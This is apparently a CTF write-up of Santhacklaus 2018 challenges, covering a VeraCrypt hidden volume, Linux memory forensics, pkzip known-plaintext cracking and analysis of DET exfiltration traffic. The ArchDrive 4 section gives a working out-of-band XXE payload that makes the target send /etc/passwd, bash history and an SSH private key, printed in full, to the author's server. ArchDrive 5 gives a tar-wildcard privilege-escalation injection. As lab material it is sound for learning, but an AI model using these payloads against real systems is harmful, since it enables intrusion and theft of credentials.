> -rwxr-xr-x     0     0   7080168 19-Dec-2018 10:28 a.ha_-\_TakeOnMe.mp3

Let's try to decrypt the `media` container with the given key and the MP3 as keyfiles:

```bash
$ cp clear_media.dmp hidden_media.dmp 
```

<center>
![](https://media.giphy.com/media/l3q2GZaeJ4v24D7P2/giphy.gif)
</center>

WTF, it worked! You're really crazy guys, first time seeing this in a CTF! :D

```bash
$ sudo dd if=/dev/mapper/veracrypt3 of=clear_media_hidden.dmp bs=4M

$ sudo testdisk clear_media_hidden.dmp 
```

<center>
![](/img/writeups/santhacklaus2018/archdrive3_4.png)
_Fig 5_: Documents in the hidden container
</center>

## Flag

In `FLAG.TXT`:

> IMTLD{I_h4v3_N0th1ng_T0_h1d3}

# ArchDrive 4/3

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | ArchDrive&nbsp;4/3       | Web         |   700    | 8     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_archdrive4.png)
_Fig 1_: "ArchDrive 4/3" statement
</center>

## State of the art

After recovering the erased zip archive in the hidden container, we obtain two files:

* README.md
* ticket.xml

```bash
$ unzip Dark_Lottery_ticket_d2e383e8600daf6dc31c2436aefd3f58.zip 
Archive:  Dark_Lottery_ticket_d2e383e8600daf6dc31c2436aefd3f58.zip
  inflating: ticket.xml              
  inflating: README.md

$ cat README.md
### This ticket is the property of `Dark Lottery` ###
If you are not the buyer and if you found / stole this ticket, you must delete it immediately.
This ticket is unique, do not share it.
Remember to use it at your own risk.

Thank you for your purchase !

--- scgz54b2lftqkkvn.onion ---

$ cat ticket.xml                      
<ticket>
    <number>14453</number>
    <status>valid</status>
    <date>20/12/2018</date>
    <type>premium</date>
</ticket>
```

## Tor browsing (BUYING DRUGS)

What happens on this onion website:

<center>
![](/img/writeups/santhacklaus2018/archdrive4_1.png)
_Fig 2_: Onion website
</center>

It's impossible to buy ticket, it's SOLD OUT :'(
But if you got one, you can play:

<center>
![](/img/writeups/santhacklaus2018/archdrive4_2.png)
_Fig 3_: Wrong ticket
</center>

Ooooook, our ticket doesn't work. Here is what we got:

* XML file
* Upload form
* Same output

It looks to be a blind XXE, or XXE OOB (Out of band): https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/

## XXE OOB

I will not use `ngrok` trick, because I got my VPS now. Before starting, __ironforge__ is my VPS and __miniverse__ is my laptop.

I craft a new ticket:

```bash
miniverse $ cat ticket.xml 
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE number [ <!ENTITY % pe SYSTEM "http://51.75.29.170:12345/bite.dtd"> %pe; %param1; ]>
<ticket>
    <number>&external;</number>
    <status>valid</status>
    <date>20/12/2018</date>
    <type>premium</date>
</ticket>
```

The IP address is my VPS (where https://ctf.maki.bzh is hosted). This XML code, will grab the dtd file on my VPS, then:

```bash
ironforge $ cat bite.dtd
<!ENTITY % stuff SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY external SYSTEM 'http://51.75.29.170:12346/a.php?data=%stuff;'>">
```

The first XML will grab `bite.dtd` file, which send the content of `/etc/passwd` (base64 encoded) on the port __12346__ of my VPS:

<center>
![](/img/writeups/santhacklaus2018/archdrive4_3.gif)
_Fig 4_: XXE OOB in a GIF
</center>

It works!

## File extraction

In the `/etc/passwd` file, only one user got `/bin/bash` shell: __root__, what does it contain?

```bash
ironforge $ cat bite.dtd
<!ENTITY % stuff SYSTEM "php://filter/convert.base64-encode/resource=/root/.bash_history">
<!ENTITY % param1 "<!ENTITY external SYSTEM 'http://51.75.29.170:12346/a.php?data=%stuff;'>">

ironforge $ nc -lvp 12346
Listening on [0.0.0.0] (family 0, port 12346)
Connection from 113.ip-51-75-202.eu 49966 received!
GET /a.php?data=bHMgLWxhIC9ob21lL2RhcmtfbG90dGVyeS8uc3NoL2lkX3JzYSAKY2F0IC9ob21lL2RhcmtfbG90dGVyeS8uc3NoL2lkX3JzYSAK HTTP/1.0
Host: 51.75.29.170:12346
Connection: close

ironforge $ echo -n 'bHMgLWxhIC9ob21lL2RhcmtfbG90dGVyeS8uc3NoL2lkX3JzYSAKY2F0IC9ob21lL2RhcmtfbG90dGVyeS8uc3NoL2lkX3JzYSAK' | base64 -d
ls -la /home/dark_lottery/.ssh/id_rsa 
cat /home/dark_lottery/.ssh/id_rsa
```

## SSH connection

Ok, ssh keys, it start to smells good :D
Following the same process, I extract:

* /home/dark_lottery/.ssh/id_rsa
* /etc/ssh/sshd_config

> /home/dark_lottery/.ssh/id_rsa

```raw
-----BEGIN RSA PRIVATE KEY-----
MIICXQIBAAKBgQC3e6s3ZeRV/lgTltFgmVLB/LBYtzRBSpQUEt/1g/MsMidRhdBw
W0kDlgchsVHL6kGt26JtHVr04MdFSeCUHiSJVuuqDiEPae+98l4LOWWg2dXwKsIv
x6qDobCyGNi7HzmkxNTh+NxLq+aIsjk/gw38HtNkZAqwokySDcZhgwHFawIDAQAB
AoGAQqB/vfAcCDYB2assgL1sVdDiYHS2Xvcr6lYoSUkO5n+X03yaAhLD4q96C3wO
TdPU4cMdqi28t6tf8QMwr9h6P1+M7CDTsyBQbR7bvm88yzGNBuE9P3oBiKu24+x0
lPL1TORpHxGOersUz3eH2+hdnGs3xDYNSk8RoUY6ckCv3AECQQDbdwhuvDo+cnkN
xupfdvSRTfXH05fosfvim6/yvw0ZeyxyAzXE5/KclpNCXzW70JrVI4huXjk5TD7l
R019nJprAkEA1gcw48pAjFSc6oTexR1ayHQYGFGSx7PvXi+VJHAyFTXP4+l+pk72
qFlrT4tYMiZqbCws9qAthpsTBnauspBBAQJBAMWOwn2EXV3niEc5n7NuDrxalHxc
YivrRFZ6VYnMJ8ufUKQVdaqaLZB+D3O451L5dteU0/SeRx7oHtogNIZ1mZ8CQAYp
mNfGOAuSWB5MixmD2dxRs2vn1WEYpjjBB/tPm7GOphi63WGufl2kjXlx2q0+++t3
bif/vq/UgTy7aBZOHwECQQC4jty8EX0KdvylXIRzhCK7XvHze+GXHFptaB1wf+Wr
LAKwqo3/gOiPe8w5CRUWuDfuy04a81OBEF3Gv2pyVctg
-----END RSA PRIVATE KEY-----
```

> /etc/ssh/sshd_config

```raw
### SSH configuration file ###

# General
Port 2020
Protocol 2
AcceptEnv LANG LC_*
[...]
```

We got a port and a private key :D

```bash
miniverse $ chmod 600 dark_lottery_priv.key
miniverse $ ssh -i dark_lottery_priv.key dark_lottery@51.75.202.113 -p 2020


    ___           _        __       _   _
   /   \__ _ _ __| | __   / /  ___ | |_| |_ ___ _ __ _   _
  / /\ / _` | '__| |/ /  / /  / _ \| __| __/ _ \ '__| | | |
 / /_// (_| | |  |   <  / /__| (_) | |_| ||  __/ |  | |_| |
/___,' \__,_|_|  |_|\_\ \____/\___/ \__|\__\___|_|   \__, |
                                                      |___/
Last login: Fri Dec 21 18:28:07 2018 from 77.206.71.218

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
dark_lottery@9db68003fdde:~$ ls
flag.txt
```

## Flag

> IMTLD{Wh4t_4_H4rD_ch4lL3nge}

# ArchDrive 5/3

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | ArchDrive&nbsp;5/3       | App-script         |   300    | 8     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_archdrive5.png)
_Fig 1_: "ArchDrive 5/3" statement
</center>

## State of the art

Let's privesc. As I said in NetRunner 3/3, there are few ways to privesc:

* sudo misconfigured
* crontab or services running as privileged user
* suid binary or script to exploit

```bash
$ sudo -l
-bash: sudo: command not found

$ ps aux| grep root
root         1  0.0  0.0  19708  3200 ?        Ss   Dec21   0:00 /bin/bash ./start.sh
root         8  0.0  0.0  69952  5756 ?        S    Dec21   0:00 /usr/sbin/sshd -D
root         9  0.0  0.0  29740  2808 ?        S    Dec21   0:00 cron -f
root        97  0.0  0.0  19952  3656 pts/2    Ss+  Dec21   0:00 bash
root     13454  0.0  0.0  69952  6504 ?        Ss   12:20   0:00 sshd: dark_lottery [priv]
dark_lo+ 13539  0.0  0.0  11112   988 pts/0    S+   12:26   0:00 grep root
```

Crontab as root, nice, let's find the cron script:

```bash
$ ls -la /
total 84
drwxr-xr-x   1 root root 4096 Dec 21 18:26 .
drwxr-xr-x   1 root root 4096 Dec 21 18:26 ..
-rwxr-xr-x   1 root root    0 Dec 21 18:26 .dockerenv
-rwxrwxr--   1 root root  147 Dec 20 18:24 backup.sh
dr--r-----   1 root root 4096 Dec 22 12:27 backups
drwxr-xr-x   1 root root 4096 Dec 20 18:26 bin
drwxr-xr-x   2 root root 4096 Oct 20 10:40 boot
[...]
```

The `backup.sh` file is not a regular linux file :p

```bash
$ cat /backup.sh
#!/bin/sh

/bin/rm -rf /backups/*
cd /opt/src/ && /bin/tar -cvzf /backups/bck-src_`/bin/date +"%Y-%m-%d_%H%M"`.tar.gz *
/bin/chmod 440 -R /backups
```

Ok, the exploit is tar wildcard: https://thanat0s.trollprod.org/2014/07/et-hop-ca-root/

## Exploit

First, where is the flag:

```bash
$ ls -la /opt/src 
total 12
drwxrwxrwx 1 root root 4096 Dec 21 19:03 .
drwxr-xr-x 1 root root 4096 Dec 20 18:27 ..
-r--r----- 1 root root   26 Dec 20 18:24 .flag.txt
```

Second, exploit time :D

```bash
$ touch -- '--checkpoint-action=exec=sh install_suidbackdoor.sh' '--checkpoint=1'
$ echo 'cp /opt/src/.flag.txt /tmp/flag_maki' > install_suidbackdoor.sh
$ echo 'chmod 777 /tmp/flag_maki' >> install_suidbackdoor.sh
```

After a minute: 

```bash
$ ls -la /tmp/flag_maki
-rwxrwxrwx 1 root root 26 Dec 22 12:32 /tmp/flag_maki
```

## Flag

> IMTLD{R04d_T0_Th3_sW1tCH}

# Mission impossible 1

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | Mission&nbsp;impossible&nbsp;1       | Forensic/Crypto         |   800    | 18     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_mi1.png)
_Fig 1_: "Mission impossible 1" statement


<iframe width="560" height="315" src="https://www.youtube.com/embed/pEfI3ZrLDBs" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
</center>

(Awesome work for the video, really appreciate it as a player)

## State of the art

A memory dump again :D

<center>
![](https://media.giphy.com/media/yoJC2GnSClbPOkV0eA/giphy.gif)
</center>

```bash
$ volatility -f challenge.elf imageinfo
[...]
Take a looooooooong time 
[...]

$ strings challenge.elf | grep 'Linux version' | sort | uniq
2018-12-16T11:14:09.150996-05:00 virtual-debian kernel: [    0.000000] Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14)
Dec 16 11:14:09 virtual-debian kernel: [    0.000000] Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14)
Dec 16 11:14:09 virtual-debian kernel: [10295.865806] intel_idle: does noual-debian kernel: [    0.000000] Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14)
Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14)
Linux version %d.%d.%d
MESSAGE=Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14)
```

Ok, it's a linux memory dump...

<center>
![](https://media.giphy.com/media/PGxmniUblqoqQ/giphy.gif)
</center>

## Profile generation

To do a linux profile for volatility, we need:

* Linux distribution
* Version of the distribution
* Version of the kernel

By greping on __Linux version__ we got those informations:

* Debian
* Debian 8 (the deb8u1)
* 3.16.0-6-amd64 kernel

I choose to download the latest release of Debian 8: https://cdimage.debian.org/cdimage/archive/8.11.0/amd64/iso-cd/debian-8.11.0-amd64-netinst.iso

Pro tip: Download the netinstall version of Linux, during installation, don't select any additional package except SSH.

When the Debian 8 VM is up, just ssh it and check the installed kernel:

```bash
$ ssh user@192.168.122.197

debianVM $ uname -a
Linux debian 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux
```

It looks to be the right kernel, good. No need to install a new one. Now, install package for linux profile generation and generate it:

```bash
debianVM $ sudo apt-get install -y build-essential volatility-tools dwarfdump linux-headers-3.16.0-6-amd64

debianVM $ cd /usr/src/volatility-tools/linux/
debianVM $ su root
debianVM # make
debianVM # zip MI1_profile.zip /usr/src/volatility-tools/linux/module.dwarf /boot/System.map-3.16.0-6-amd64
updating: usr/src/volatility-tools/linux/module.dwarf (deflated 91%)
updating: boot/System.map-3.16.0-6-amd64 (deflated 79%)
```

Our profile is created, we have to put in the right place for volatility:

```bash
$ sudo updatedb # I know it's deprectated :')
$ locate volatility | grep overlays | grep linux
/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux
/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/__init__.py
/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/__init__.pyc
/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/elf.py
/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/elf.pyc
/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/linux.py
/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/linux.pyc
```

Place the `MI1_profile.zip` archive in `/usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux` folder.

```bash
$ volatility --info | grep MI1
LinuxMI1_profilex64   - A Profile for Linux MI1_profile x64
```

Let's try if it work, to do this, just use a linux volatility plugin, such as `linux_banner`:

```bash
$ volatility -f challenge.elf --profile=LinuxMI1_profilex64 linux_banner
Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14)
```

It works!

<center>
![](https://media.giphy.com/media/4PT6v3PQKG6Yg/giphy.gif)
</center>

MI1_profile.zip: https://mega.nz/#!mSRCCQ6L!HRz6qJ02pwlg89Gcc1OQ-iIgBzaAWW6EKIThFXLg3Mc

## Raiders of the Lost Zip

What did the user on the system?

```bash
$ volatility -f challenge.elf --profile=LinuxMI1_profilex64 linux_bash
Pid      Name                 Command Time                   Command
-------- -------------------- ------------------------------ -------
    1867 bash                 2018-12-16 16:17:45 UTC+0000   rm flag.txt 
    1867 bash                 2018-12-16 16:17:45 UTC+0000   ls
    1867 bash                 2018-12-16 16:17:45 UTC+0000   ls
    1867 bash                 2018-12-16 16:17:45 UTC+0000   sudo reboot
    1867 bash                 2018-12-16 16:17:45 UTC+0000   zip -r -e -s 64K backup.zip *
    1867 bash                 2018-12-16 16:17:45 UTC+0000   cat /dev/urandom > flag.txt 
    1867 bash                 2018-12-16 16:17:45 UTC+0000   cd /var/www/a-strong-hero.com/
    1867 bash                 2018-12-16 16:17:45 UTC+0000   sudo reboot
    1867 bash                 2018-12-16 16:17:49 UTC+0000   cd /var/www/a-strong-hero.com/
    1867 bash                 2018-12-16 16:17:49 UTC+0000   ls
    1867 bash                 2018-12-16 16:18:09 UTC+0000   find . -type f -print0 | xargs -0 md5sum > md5sums.txt
    1867 bash                 2018-12-16 16:18:10 UTC+0000   cat md5sums.txt
```

Hmmm... What an ugly zip command. After reading the zip manual, actually this command will encrypt recursively and split the original archive into 64Ko pieces. In order to find all parts, let's list all file opened in memory:

```bash
$ volatility -f challenge.elf --profile=LinuxMI1_profilex64 linux_find_file -L > filelist 

$ cat filelist | grep backup
          261933 0xffff88001e61e4b0 /var/www/a-strong-hero.com/backup.z02
          263120 0xffff88001e61e898 /var/www/a-strong-hero.com/backup.z05
          263122 0xffff88001e61ec80 /var/www/a-strong-hero.com/backup.z07
          263123 0xffff88001e61d0c8 /var/www/a-strong-hero.com/backup.z08
          263125 0xffff88001e61d4b0 /var/www/a-strong-hero.com/backup.zip
          261792 0xffff88001e61d898 /var/www/a-strong-hero.com/backup.z01
          262990 0xffff88001e61dc80 /var/www/a-strong-hero.com/backup.z04
          263121 0xffff88001e61c0c8 /var/www/a-strong-hero.com/backup.z06
          263124 0xffff88001e61c4b0 /var/www/a-strong-hero.com/backup.z09
          262949 0xffff88001e61cc80 /var/www/a-strong-hero.com/backup.z03
```

I think I found all pieces! Let's extract them and recreate the original archive:

```bash
$ volatility -f challenge.elf --profile=LinuxMI1_profilex64 linux_find_file -i 0xffff88001e61d898 -O backup.z01
[...]
Reproduce the operation with correct offset until the z09
[...]

$ zip -s 0 backup.zip --out unsplit.zip

$ unzip -l unsplit.zip 
Archive:  unsplit.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       30  2018-12-16 16:57   flag.txt
        0  2018-12-16 15:51   jcvd-website/
        0  2018-12-16 15:51   jcvd-website/js/
     6148  2018-12-16 15:51   jcvd-website/js/.DS_Store
    36816  2018-12-16 15:51   jcvd-website/js/bootstrap.min.js
    95957  2018-12-16 15:51   jcvd-website/js/jquery-1.11.3.min.js
    68890  2018-12-16 15:51   jcvd-website/js/bootstrap.js
       79  2018-12-16 15:51   jcvd-website/js/custom.js
      641  2018-12-16 15:51   jcvd-website/js/ie10-viewport-bug-workaround.js
     5564  2018-12-16 15:51   jcvd-website/js/jquery.easing.min.js
    12292  2018-12-16 15:51   jcvd-website/.DS_Store
        0  2018-12-16 15:51   jcvd-website/images/
    37682  2018-12-16 15:51   jcvd-website/images/concert.jpg
     6148  2018-12-16 15:51   jcvd-website/images/.DS_Store
    52003  2018-12-16 15:51   jcvd-website/images/microphone.jpg
    49276  2018-12-16 15:51   jcvd-website/images/iphone.jpg
    91733  2018-12-16 15:51   jcvd-website/images/header.jpg
    26267  2018-12-16 15:51   jcvd-website/images/writing.jpg
   133773  2018-12-16 15:51   jcvd-website/images/pencil_sharpener.jpg
     7384  2018-12-16 15:51   jcvd-website/index.html
        0  2018-12-16 15:51   jcvd-website/fonts/
    45404  2018-12-16 15:51   jcvd-website/fonts/glyphicons-halflings-regular.ttf
    18028  2018-12-16 15:51   jcvd-website/fonts/glyphicons-halflings-regular.woff2
    23424  2018-12-16 15:51   jcvd-website/fonts/glyphicons-halflings-regular.woff
    20127  2018-12-16 15:51   jcvd-website/fonts/glyphicons-halflings-regular.eot
   108738  2018-12-16 15:51   jcvd-website/fonts/glyphicons-halflings-regular.svg
        0  2018-12-16 15:51   jcvd-website/css/
     6148  2018-12-16 15:51   jcvd-website/css/.DS_Store
   147430  2018-12-16 15:51   jcvd-website/css/bootstrap.css
     8335  2018-12-16 15:51   jcvd-website/css/custom.css
   122540  2018-12-16 15:51   jcvd-website/css/bootstrap.min.css
---------                     -------
  1130857                     31 files
```

The archive is password protected, but we can break pkzip encryption with known plaintext attack using `pkcrack`. I need a clear file and the same file encrypted in the zip archive. I choosed `microphone.jpg`.

```bash
$ cat filescan | grep microphone.jpg    
          261768 0xffff88003ce0f898 /var/www/a-strong-hero.com/jcvd-website/images/microphone.jpg

$ volatility -f challenge.elf --profile=LinuxMI1_profilex64 linux_find_file -i 0xffff88003ce0f898 -O microphone.jpg

$ zip micro.zip microphone.jpg

$ pkcrack-1.2.2/src/pkcrack -C unsplit.zip -c "jcvd-website/images/microphone.jpg" -P micro.zip -p "microphone.jpg" -d bitedepoulet.zip -a
Done. Left with 96 possible Values. bestOffset is 40412.
Ta-daaaaa! key0=751f036a, key1=397078fa, key2=d156dfac
Probabilistic test succeeded for 11365 bytes.
Ta-daaaaa! key0=751f036a, key1=397078fa, key2=d156dfac
Probabilistic test succeeded for 11365 bytes.
Ta-daaaaa! key0=751f036a, key1=397078fa, key2=d156dfac
Probabilistic test succeeded for 11365 bytes.
Ta-daaaaa! key0=751f036a, key1=397078fa, key2=d156dfac
Probabilistic test succeeded for 11365 bytes.
Decrypting flag.txt (91c644af94249dd314b62b57)... OK!
Decrypting jcvd-website/js/.DS_Store (2fe6d64c750f20da2d6b7b4e)... OK!
Decrypting jcvd-website/js/bootstrap.min.js (31beae5a6417af2fcee27b4e)... OK!
Decrypting jcvd-website/js/jquery-1.11.3.min.js (68cffaef64b77eca810f7b4e)... OK!
Decrypting jcvd-website/js/bootstrap.js (172450e6004efe284b507b4e)... OK!
Decrypting jcvd-website/js/custom.js (4038fc0d73419d37a34f7b4e)... OK!
Decrypting jcvd-website/js/ie10-viewport-bug-workaround.js (71f134fe12dcf4d413c17b4e)... OK!
Decrypting jcvd-website/js/jquery.easing.min.js (dd66d46318af5411b24b7b4e)... OK!
Decrypting jcvd-website/.DS_Store (ccc90b8c7a949b1dd0297b4e)... OK!
Decrypting jcvd-website/images/concert.jpg (2531ab52a4c3f2af90017b4e)... OK!
Decrypting jcvd-website/images/.DS_Store (cd53bfa34fee99aade507b4e)... OK!
Decrypting jcvd-website/images/microphone.jpg (e04e73cca1576915c96f7b4e)... OK!
Decrypting jcvd-website/images/iphone.jpg (7d0e3ddec5bb0eb5d5537b4e)... OK!
Decrypting jcvd-website/images/header.jpg (558cd122c491a4c95df47b4e)... OK!
Decrypting jcvd-website/images/writing.jpg (de9b24799ceac1377f317b4e)... OK!
Decrypting jcvd-website/images/pencil_sharpener.jpg (89cbb73d79aa6c0472607b4e)... OK!
```

The archive is not fully decrypted, there are some glitch. But it's not a problem because `flag.txt` is properly decrypted! Then you just have to `strings` the new archive.

## Flag

```bash
$ strings bitedepoulet.zip | grep IMTLD
IMTLD{z1p_1s_n0t_alw4y5_s4fe}
```

# Mission impossible 2

<center>

| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | Mission&nbsp;impossible&nbsp;2/2       | Forensic/Crypto/Network         |   500    | 22     |

</center>

## Statement

<center>
![](/img/writeups/santhacklaus2018/statement_mi2.png)
_Fig 1_: "Mission impossible 2" statement


<iframe width="560" height="315" src="https://www.youtube.com/embed/NA2UkAcXdL0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
</center>

(Awesome work again for the video :D)

## State of the art

We got again a Debian memory dump, fortunately it's the same profile for the `Mission impossible 1` and this one.

```bash
$ volatility -f challenge.raw --profile=LinuxMI1_profilex64 linux_banner
Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14)

$ volatility -f challenge.raw --profile=LinuxMI1_profilex64 linux_bash
Pid      Name                 Command Time                   Command
-------- -------------------- ------------------------------ -------
    1715 bash                 2018-11-09 22:56:08 UTC+0000   cd DET/
    1715 bash                 2018-11-09 22:56:08 UTC+0000   nano config.json 
    1715 bash                 2018-11-09 22:56:08 UTC+0000   sudo pip install -r requirements.txt 
    1715 bash                 2018-11-09 22:56:08 UTC+0000   cd /opt/
    1715 bash                 2018-11-09 22:56:08 UTC+0000   ls -alh
    1715 bash                 2018-11-09 22:56:08 UTC+0000   sudo git clone https://github.com/sensepost/DET
    1715 bash                 2018-11-09 22:56:08 UTC+0000   sudo python det.py -c config.json -p icmp,http -f flag.zip 
    1715 bash                 2018-11-09 22:56:08 UTC+0000   rm flag.zip 
    1715 bash                 2018-11-09 22:56:08 UTC+0000   cp config-sample.json config.json 
    1715 bash                 2018-11-09 22:56:08 UTC+0000   zip flag.zip flag.jpg -P IMTLD{N0t_Th3_Fl4g}
    1715 bash                 2018-11-09 22:56:08 UTC+0000   rm flag.jpg 
    1715 bash                 2018-11-09 22:56:08 UTC+0000   sudo chown -R evil-hacker:evil-hacker /opt/DET/
    1715 bash                 2018-11-09 22:56:08 UTC+0000   cp -v /media/evil-hacker/DISK_IMG/FOR05/flag.jpg .
    1715 bash                 2018-11-09 22:56:47 UTC+0000   history
    1715 bash                 2018-11-09 22:57:12 UTC+0000   cd /opt/DET/
    1715 bash                 2018-11-09 22:57:48 UTC+0000   find . -type f -print0 | xargs -0 md5sum md5sums.txt
    1715 bash                 2018-11-09 22:57:57 UTC+0000   find . -type f -print0 | xargs -0 md5sum > md5sums.txt
```

Owh! The user is used DET (Data Exfiltration Toolkit), a little client / server for data exfiltration made by @PaulWebSec: https://github.com/sensepost/DET

So, the evil hacker exfiltrates his data through ICMP and HTTP, according to the bash history. Fortunately, it's what we got in the PCAP:

<center>
![](/img/writeups/santhacklaus2018/mi2_1.png)
_Fig 2_: Base64 data in the PCAP
</center>

* red framed shows the ICMP data
* green framed shows the HTTP data

## How DET works?

It uses a configuration file `config.json`:

```bash
$ volatility -f challenge.raw --profile=LinuxMI1_profilex64 linux_find_file -L > filelist

$ cat filelist | grep config.json
          672629 0xffff88003c16ec80 /opt/DET/config.json

$ volatility -f challenge.raw --profile=LinuxMI1_profilex64 linux_find_file -i 0xffff88003c16ec80 -O config.json

$ cat config.json
{
    "plugins": {
        "http": {
            "target": "192.168.0.29",
            "port": 8080
        },
        "google_docs": {
            "target": "SERVER",
            "port": 8080
        },        
        "dns": {
            "key": "google.com",
            "target": "192.168.0.29",
            "port": 53
        },
        "gmail": {
            "username": "dataexfil@gmail.com",
            "password": "CrazyNicePassword",
            "server": "smtp.gmail.com",
            "port": 587
        },
        "tcp": {
            "target": "192.168.0.29",
            "port": 6969
        },
        "udp": {
            "target": "192.168.0.29",
            "port": 6969
        },
        "twitter": {
            "username": "PaulWebSec",
            "CONSUMER_TOKEN": "XXXXXXXXXXX",
            "CONSUMER_SECRET": "XXXXXXXXXXX",
            "ACCESS_TOKEN": "XXXXXXXXXXX",
            "ACCESS_TOKEN_SECRET": "XXXXXXXXXXX"
        },
        "icmp": {
            "target": "192.168.0.29"
        },
        "slack": {
            "api_token": "xoxb-XXXXXXXXXXX",
            "chan_id": "XXXXXXXXXXX",
            "bot_id": "<@XXXXXXXXXXX>:"
        }
    },
    "AES_KEY": "IMTLD{This_is_just_a_key_not_the_flag}",
    "max_time_sleep": 10,
    "min_time_sleep": 1,
    "max_bytes_read": 400,
    "min_bytes_read": 300,
    "compression": 1
}
```

So, now we got those informations:

* AES Key: IMTLD{This_is_just_a_key_not_the_flag}
* We know it uses DET compression (zlib)

## How data are exfiltrated?

This is what it looks like in HTTP packets:

<center>
![](/img/writeups/santhacklaus2018/mi2_2.png)
_Fig 3_: Base64 data through HTTP
</center>

With a little `tshark` command I was able to extract all base64:

```bash
$ tshark -r challenge.pcapng -Y http -Tfields -e urlencoded-form.value > data_http.b64

$ cat data_http.b64 | base64 -d | less
z6f9HaX|!|1|!|246760c25e3f659efe1b8299032616c0a6c92ce1d72addcf01183fd535d83abc5ce238d49d9bd255e8be9161ba00ab68a5dc2882c9159d055002085b7c0bb55b5ffe596b9229ac6280acacec248d187b2559fc4e1d8eb2a2711aeaf96616b52c39410d6423f877817cdb8e827086badbf1390331c87e2291c56756f696f4f02bb26d2ccf93c906c91ddebe9a2f68086e679a3c562217646afe79227ef5b9c485ffaef859fe42c35e4627a63c017d39b5e8d11fb32ddce0d88cbbb5a74c0215e3be78de850fa30b0b03cffaa041096810459559864c9f0bc0ac4e214c58ca8b89b73248130f096005a00b555d028d8c8cd7f69e57d6f925c2ea262a3b067d809dfaf8f825e7c4b8e02a54376d5d209a1e15a3866f544a03917a80cc183def3b6fac629a5e6fbdcbcf6cbe0a1713791651fbf6cd1917601b18709e3738bc03c4ba8ce55f13df90ed4603bb1d86de0fa4ab8d36a4ab010477e3270d31439e446d872730
z6f9HaX|!|5|!|8f7507923c3481c900f9d0c2b84b9517b1b0bf488148a9759bf26205c6471295e591587ae7d11d871bd31080b390d444d972a60eb799d3ea8ac7da599695588c8052a5d14ea1aa93ae6af1d6f76f4d62483a60f1c6e3713d31245f1817699695f1cb44e4b4ce1a6737cab1ac04f17a21d1053be83a6a59bc287ee5a42a7ec6dff033645715ef41e72bcf7495fcf04785c7612bd64def432940f13959c73d9cf79fb364ba6a5a891a713abb58bde1486caf187f9a398078c0744652838059ce0d10b903279692f0513e0f88af96796d85ab2f712866c2d8637a746e0d228bb736384e6c43ef253a0aa7cfba1219ce2393ce57bcf05b53a858858a665bc80d46c51289dcb6e9674c30563d03bbb80221e714349ffadf19afcce37206b8da66ef5f7fb2f3739c64f9699536ff545b73a6d37de627cb
[...]

$ tshark -r challenge.pcapng -Y icmp.resp_to -Tfields -e data.data | tr -d ':' | xxd -r -p | sed 's/ejZmO/\nejZmO/g' > data_icmp.b64

$ cat data_icmp.b64 | base64 -d | less
z6f9HaX|!|flag.zip|!|REGISTER|!|3682490664d5bf7905397710edb84737
